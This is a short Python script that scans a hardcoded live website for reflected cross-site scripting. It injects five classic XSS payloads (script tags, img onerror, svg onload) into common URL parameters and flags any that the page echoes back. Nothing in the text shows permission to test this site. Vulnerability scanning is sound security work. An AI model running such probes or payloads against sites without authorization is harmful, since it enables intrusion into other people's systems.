#!/usr/bin/env python3
"""Test for XSS vulnerabilities in URL parameters"""
import aiohttp
import asyncio
import sys

PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "';alert('XSS');//",
]

async def test_xss(session, url, param):
    """Test a single parameter for XSS"""
    results = []
    for payload in PAYLOADS:
        test_url = f"{url}?{param}={payload}"
        try:
            async with session.get(test_url, timeout=10) as resp:
                body = await resp.text()
                if payload in body:
                    results.append({
                        'payload': payload,
                        'reflected': True,
                        'status': resp.status
                    })
                    print(f"  [!] REFLECTED: {payload[:50]}...")
                else:
                    results.append({
                        'payload': payload,
                        'reflected': False,
                        'status': resp.status
                    })
        except Exception as e:
            results.append({
                'payload': payload,
                'reflected': False,
                'error': str(e)
            })
    return results

async def main():
    target = "https://oneresume.life"
    common_params = ['q', 'search', 'query', 'id', 'page', 'name', 'email', 'user', 'redirect']
    
    print(f"[*] Testing XSS on {target}")
    print(f"[*] Testing {len(common_params)} common parameters")
    print()
    
    async with aiohttp.ClientSession() as session:
        for param in common_params:
            print(f"[*] Testing parameter: {param}")
            results = await test_xss(session, target, param)
            reflected = [r for r in results if r.get('reflected')]
            if reflected:
                print(f"  [+] VULNERABLE! {len(reflected)} payloads reflected")
            else:
                print(f"  [-] Not vulnerable")
    
    print()
    print("[*] Done. If any parameters showed REFLECTED, the site is vulnerable to XSS.")

if __name__ == "__main__":
    asyncio.run(main())
